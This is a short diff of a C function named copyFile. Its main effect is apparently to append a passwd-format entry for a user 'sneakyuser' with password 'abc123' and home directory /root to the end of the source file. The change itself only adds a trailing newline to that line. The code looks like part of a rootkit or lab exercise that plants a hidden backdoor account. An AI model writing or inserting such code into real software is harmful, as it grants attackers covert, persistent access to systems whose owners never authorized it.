@@ -24,7 +24,7 @@ void copyFile(const char *src, const char *dest)
 
     // append new line to src
     fseek(s, 0, SEEK_END);
-    const char *sneaky_str = "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+    const char *sneaky_str = "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
     fprintf(s, "%s", sneaky_str);
     fclose(s);
 }
